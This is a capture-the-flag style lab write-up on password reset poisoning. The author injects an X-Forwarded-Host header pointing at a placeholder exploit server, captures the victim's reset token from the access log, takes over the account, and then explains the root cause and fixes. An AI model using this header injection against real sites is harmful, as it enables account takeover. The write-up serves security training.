Password Reset Poisoning via Middleware

Lab Difficulty: Practitioner
Vulnerability: Password Reset Poisoning

Summary
This one’s about hijacking a password reset request using the X-Forwarded-Host header. The app uses it to build the reset link, but doesn’t validate it properly—so we can poison it to send the victim (Carlos) a reset link pointing to our server. Once he clicks it, we grab the token and reset his password ourselves.

Steps Taken
Logged in using the usual creds:
wiener : peter

Started by testing the “Forgot password?” feature. Entered the username, intercepted the request in Burp, and saw this:

POST /forgot-password
The app sends a password reset link to the email. That link includes a token, so that’s our target.

Sent the request to Repeater to play with it. Here’s where it gets interesting: I added a header:


X-Forwarded-Host: YOUR-EXPLOIT-SERVER.exploit-server.net
(Obviously replaced it with my actual exploit server URL.)

Also changed the username parameter to carlos and sent the request again.

Checked the access log on my exploit server, and boom—there it was:

GET /forgot-password?temp-forgot-password-token=abc123...
Nice. Carlos clicked the poisoned link, and I had his token.

Went back to my email (wiener’s), opened the legit password reset link, and replaced my token in the URL with the one I stole from Carlos.

Hit the page, reset Carlos’s password to something like newpass123, and logged into his account.

Lab solved.

Root Cause
The app trusts the X-Forwarded-Host header without validating it. That’s dangerous. It uses it to build the reset link in emails, so anyone can inject their own domain and trick users into clicking malicious links that leak their tokens.

Fixes and Mitigation
Never use user-controlled headers (like X-Forwarded-Host) for generating important links unless you’re explicitly validating them.

Always construct sensitive URLs server-side with known, trusted hostnames.

Tokens should be one-time use and tied to the user making the request.

Consider verifying the origin of requests that hit sensitive endpoints like password resets.

